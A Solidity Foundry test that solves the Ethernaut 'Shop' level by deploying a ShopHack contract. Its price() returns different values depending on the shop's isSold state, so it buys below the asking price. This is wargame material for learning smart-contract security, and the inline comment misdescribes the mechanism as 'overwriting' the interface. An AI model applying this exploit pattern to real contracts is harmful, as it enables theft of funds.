// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Shop/ShopFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract ShopTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testShopHack() public {
        /****************
         * Factory setup *
         *************** */
        ShopFactory ShopFactory = new ShopFactory();
        ethernaut.registerLevel(ShopFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(ShopFactory);
        Shop ethernautShop = Shop(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        /*
         *In this level, we can simply declare a hack contract
         * which will contain both buy and price function (price from Buyer interface)
         * By doing so, in the execution context,
         * - we call buy on the challenge, from our malicious contract
         * - it will use the msg.sender to declare a Buyer interface
         * - However, we already have a price function
         * - So our price function will overwrite the Buyer function
         * - In this function, we just check is isSold is true to return either 1 or 1000
         *
         * - if true, we return 1 to meet this condition:
         * _buyer.price() >= price[TRUE] && !isSold[FALSE] so we don't pass
         *
         * - IF it's false, return 1000
         * 1000 >= price => TRUE
         * !isSold => True
         */
        ShopHack shopHack = new ShopHack(levelAddress);
        shopHack.buy();

        assertEq(ethernautShop.isSold(), true);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract ShopHack {
    Shop challenge;

    constructor(address victim) {
        challenge = Shop(victim);
    }

    function buy() external {
        challenge.buy();
    }

    function price() external view returns (uint256) {
        return challenge.isSold() ? 1 : 1000;
    }
}
